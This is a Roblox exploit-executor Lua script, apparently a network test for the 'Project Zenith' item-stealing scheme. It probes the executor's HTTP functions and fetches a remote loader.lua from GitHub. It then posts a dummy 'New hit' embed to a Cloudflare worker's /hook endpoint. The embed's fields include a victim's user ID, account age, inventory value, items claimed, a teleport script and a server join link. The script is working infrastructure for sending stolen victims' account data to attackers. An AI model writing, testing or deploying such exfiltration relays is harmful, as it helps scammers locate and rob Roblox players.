getgenv().ZenithNetTest = getgenv().ZenithNetTest or false
if getgenv().ZenithNetTest then return end
getgenv().ZenithNetTest = true

local HttpService = game:GetService("HttpService")

local TOKEN = getgenv().token or ""
local WORKER = "https://zenith-protector.gangetnpa.workers.dev"

print("[NETTEST] ============================================")
print("[NETTEST] token:", TOKEN, "(len:", #TOKEN .. ")")
print("[NETTEST] worker:", WORKER)
print("[NETTEST] ============================================")

if type(TOKEN) ~= "string" or #TOKEN ~= 32 then
    print("[NETTEST] FATAL: bad token")
    return
end

local function try(name, fn)
    local ok, result = pcall(fn)
    if ok then
        local code = "?"
        local body = ""
        if type(result) == "table" then
            code = result.StatusCode or result.status or "?"
            body = result.Body or result.body or ""
        elseif type(result) == "string" then
            code = "string"
            body = result
        end
        print(string.format("[NETTEST] %-25s OK   code=%s body=%s", name, tostring(code), tostring(body):sub(1, 120)))
        return true
    else
        print(string.format("[NETTEST] %-25s FAIL %s", name, tostring(result):sub(1, 200)))
        return false
    end
end

print("[NETTEST] --- HTTP method availability ---")
print("[NETTEST] request:", type(request))
print("[NETTEST] http_request:", type(http_request))
print("[NETTEST] httprequest:", type(httprequest))
print("[NETTEST] syn:", type(syn))
print("[NETTEST] syn.request:", type(syn and syn.request))
print("[NETTEST] HttpGet:", type(game.HttpGet))
print("[NETTEST] HttpGetAsync:", type(game.HttpGetAsync))

print("[NETTEST] --- Test 1: game:HttpGet to root ---")
try("HttpGet root", function()
    return game:HttpGet(WORKER .. "/")
end)

print("[NETTEST] --- Test 2: game:HttpGet to register (should 405 or 403) ---")
try("HttpGet register", function()
    return game:HttpGet(WORKER .. "/register")
end)

print("[NETTEST] --- Test 3: HttpService:GetAsync ---")
try("HttpService:GetAsync", function()
    return HttpService:GetAsync(WORKER .. "/")
end)

print("[NETTEST] --- Test 4: HttpService:RequestAsync ---")
try("HttpService:RequestAsync", function()
    return HttpService:RequestAsync({
        Url = WORKER .. "/",
        Method = "GET",
    })
end)

print("[NETTEST] --- Test 5: game:HttpGet external (cloudflare.com) ---")
try("HttpGet cloudflare", function()
    return game:HttpGet("https://www.cloudflare.com/")
end)

print("[NETTEST] --- Test 6: game:HttpGet github ---")
try("HttpGet github", function()
    return game:HttpGet("https://raw.githubusercontent.com/PreZ-z/Zen/main/loader.lua")
end)

print("[NETTEST] --- Test 7: request POST to /hook (real hit) ---")
local nonce = ""
for i = 1, 32 do
    nonce = nonce .. string.char(math.random(97, 122))
end

local payload = {
    content = "New hit",
    username = "Zenith",
    embeds = {{
        title = "**test**",
        description = "```Status        : Pending\nItems Claimed : 0 / 0\nRap Claimed   : 0 / 0```",
        color = 10494192,
        fields = {
            { name = "**Player Info**", value = "```User        : test\nUser ID     : 1\nAge         : 0 days\nTotal Rap   : 0\nTotal USD   : $0.00\nTokens      : 0\nExecutor    : test\nPlayers     : 1/12```", inline = false },
            { name = "**Inventory - Min Rap >= 0**", value = "```\n- 1x Test - $0.00 [0/1]\n```", inline = false },
            { name = "**Teleport Script**", value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, 'fake-uuid')```", inline = false },
            { name = "**Join Link**", value = "[Click here to join](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=fake-uuid)", inline = false }
        },
        footer = {text = "Project Zenith - discord.gg/4NJwTHQaY2"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local ok_enc, json = pcall(HttpService.JSONEncode, HttpService, payload)
if not ok_enc then
    print("[NETTEST] JSONEncode failed")
    return
end
print("[NETTEST] payload size:", #json)

local ok_req, result = pcall(function()
    return request({
        Url = WORKER .. "/hook/" .. TOKEN,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json",
            ["x-z-nonce"] = nonce,
        },
        Body = json,
    })
end)

if not ok_req then
    print("[NETTEST] request POST FAIL:", tostring(result))
    print("[NETTEST] trying HttpService:RequestAsync...")
    local ok_req2, result2 = pcall(function()
        return HttpService:RequestAsync({
            Url = WORKER .. "/hook/" .. TOKEN,
            Method = "POST",
            Headers = {
                ["content-type"] = "application/json",
                ["x-z-nonce"] = nonce,
            },
            Body = json,
        })
    end)
    if not ok_req2 then
        print("[NETTEST] RequestAsync POST also FAIL:", tostring(result2))
    else
        print("[NETTEST] RequestAsync POST OK code:", result2.StatusCode, "body:", tostring(result2.Body):sub(1, 300))
    end
else
    print("[NETTEST] request POST OK code:", result.StatusCode, "body:", tostring(result.Body):sub(1, 300))
end

print("[NETTEST] ============================================")
print("[NETTEST] done. send all NETTEST lines back.")
